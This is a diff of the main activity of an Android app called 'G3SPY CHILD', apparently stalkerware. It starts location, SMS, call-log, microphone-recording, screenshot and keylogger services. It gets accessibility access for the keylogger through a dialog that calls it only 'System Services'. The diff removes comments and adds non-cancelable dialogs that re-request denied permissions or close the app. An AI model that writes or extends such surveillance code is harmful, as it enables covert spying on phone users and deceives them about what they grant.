@@ -44,7 +44,6 @@ class MainActivity : ComponentActivity() {
         Manifest.permission.RECEIVE_SMS
     )
     
-    // Additional permissions for Android 10+ (API 29+)
     private val androidQPermissions = arrayOf(
         Manifest.permission.ACCESS_BACKGROUND_LOCATION,
         Manifest.permission.ACTIVITY_RECOGNITION
@@ -55,19 +54,16 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        // Request permissions
         if (!PermissionUtil.hasPermissions(this, *requiredPermissions)) {
             ActivityCompat.requestPermissions(this, requiredPermissions, PERMISSION_REQUEST_CODE)
         }
         
-        // Request additional permissions for Android Q+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             if (!PermissionUtil.hasPermissions(this, *androidQPermissions)) {
                 ActivityCompat.requestPermissions(this, androidQPermissions, PERMISSION_REQUEST_CODE + 1)
             }
         }
         
-        // Start services
         startMonitoringServices()
         
         setContent {
@@ -83,33 +79,24 @@ class MainActivity : ComponentActivity() {
     }
     
     private fun startMonitoringServices() {
-        // Start location tracking service
+        
         startService(Intent(this, LocationService::class.java))
         
-        // Start SMS monitoring service
         startService(Intent(this, SmsService::class.java))
         
-        // Start Call Log monitoring service
         startService(Intent(this, CallLogService::class.java))
         
-        // Start microphone recording service
         startService(Intent(this, MicRecordingService::class.java))
         
-        // Start screenshot service
         startService(Intent(this, ScreenshotService::class.java))
         
-        // Try to start keylogger service (requires user to enable in Accessibility Settings)
         startService(Intent(this, KeyloggerService::class.java))
         
-        // Check if accessibility service is enabled and prompt user if needed
         if (!isAccessibilityServiceEnabled()) {
             showAccessibilityPrompt()
         }
     }
     
-    /**
-     * Checks if the accessibility service is enabled
-     */
     private fun isAccessibilityServiceEnabled(): Boolean {
         val accessibilityManager = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
         val enabledServices = accessibilityManager.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
@@ -123,15 +110,12 @@ class MainActivity : ComponentActivity() {
         return false
     }
     
-    /**
-     * Shows a dialog prompting the user to enable the accessibility service
-     */
     private fun showAccessibilityPrompt() {
         val dialogBuilder = AlertDialog.Builder(this)
             .setTitle("System Services Required")
             .setMessage("Please enable System Services in Accessibility Settings to ensure proper functionality.")
             .setPositiveButton("Open Settings") { _, _ ->
-                // Open accessibility settings
+                
                 val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                 startActivity(intent)
             }
@@ -148,11 +132,65 @@ class MainActivity : ComponentActivity() {
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         
-        // Check if we need to direct to settings for permissions
-        if (requestCode == PERMISSION_REQUEST_CODE && !PermissionUtil.hasPermissions(this, *requiredPermissions)) {
-            // Some permissions are still missing, prompt user to go to settings
-            openAppSettings()
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            val deniedPermissions = mutableListOf<String>()
+            val permanentlyDeniedPermissions = mutableListOf<String>()
+            
+            permissions.forEachIndexed { index, permission ->
+                if (grantResults.getOrNull(index) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    deniedPermissions.add(permission)
+                    
+                    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
+                        permanentlyDeniedPermissions.add(permission)
+                    }
+                }
+            }
+            
+            if (deniedPermissions.isNotEmpty()) {
+                if (permanentlyDeniedPermissions.isNotEmpty()) {
+                    showPermanentDenialDialog(permanentlyDeniedPermissions)
+                } else {
+                    showPermissionRationaleDialog(deniedPermissions)
+                }
+            }
         }
+    }
+    
+    private fun showPermissionRationaleDialog(deniedPermissions: List<String>) {
+        val permissionNames = deniedPermissions.map { 
+            PermissionUtil.getReadablePermissionName(it) 
+        }.joinToString(", ")
+        
+        AlertDialog.Builder(this)
+            .setTitle("Permissions Required")
+            .setMessage("The following permissions are necessary for the app to function properly:\n\n$permissionNames\n\nPlease grant these permissions to continue.")
+            .setPositiveButton("Grant Permissions") { _, _ ->
+                ActivityCompat.requestPermissions(this, deniedPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
+            }
+            .setNegativeButton("Cancel") { dialog, _ ->
+                dialog.dismiss()
+                finish()
+            }
+            .setCancelable(false)
+            .show()
+    }
+    
+    private fun showPermanentDenialDialog(permanentlyDeniedPermissions: List<String>) {
+        val permissionNames = permanentlyDeniedPermissions.map { 
+            PermissionUtil.getReadablePermissionName(it) 
+        }.joinToString(", ")
+        
+        AlertDialog.Builder(this)
+            .setTitle("Permissions Permanently Denied")
+            .setMessage("You have permanently denied the following permissions:\n\n$permissionNames\n\nThese permissions are essential for the app to work. Please enable them in the app settings.")
+            .setPositiveButton("Open Settings") { _, _ ->
+                openAppSettings()
+            }
+            .setNegativeButton("Exit") { _, _ ->
+                finish()
+            }
+            .setCancelable(false)
+            .show()
     }
     
     private fun openAppSettings() {
@@ -186,7 +224,7 @@ fun CyberpunkChildUI() {
             horizontalAlignment = Alignment.CenterHorizontally,
             verticalArrangement = Arrangement.Center
         ) {
-            // Title with neon glow effect
+            
             Text(
                 text = "G3SPY CHILD",
                 style = MaterialTheme.typography.displayLarge,
@@ -196,7 +234,6 @@ fun CyberpunkChildUI() {
                     .padding(bottom = 24.dp)
             )
             
-            // Status card
             Card(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -262,7 +299,6 @@ fun CyberpunkChildUI() {
             
             Spacer(modifier = Modifier.height(24.dp))
             
-            // System info
             Text(
                 text = "SYSTEM INFO",
                 style = MaterialTheme.typography.titleMedium,
@@ -270,7 +306,6 @@ fun CyberpunkChildUI() {
                 modifier = Modifier.padding(bottom = 8.dp)
             )
             
-            // Create a grid of monitoring services
             Row(
                 modifier = Modifier.fillMaxWidth(),
                 horizontalArrangement = Arrangement.SpaceEvenly
@@ -292,7 +327,6 @@ fun CyberpunkChildUI() {
             }
         }
         
-        // Footer text
         Text(
             text = "SECURE CONNECTION ESTABLISHED",
             style = MaterialTheme.typography.bodySmall,
